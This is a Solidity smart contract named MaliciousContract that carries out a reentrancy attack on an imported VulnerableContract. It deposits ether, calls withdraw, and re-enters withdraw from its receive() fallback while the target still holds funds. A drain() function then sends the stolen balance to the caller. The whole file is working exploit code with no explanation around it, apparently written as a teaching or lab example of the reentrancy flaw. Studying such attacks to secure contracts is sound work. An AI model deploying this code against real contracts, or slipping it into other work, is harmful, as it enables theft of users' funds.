// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract MaliciousContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    function attack() public payable {
        require(msg.value > 0, "No funds sent");
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw(msg.value);
    }

    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(vulnerableContract).balance > 0) {
            vulnerableContract.withdraw(msg.value);
        }
    }
}
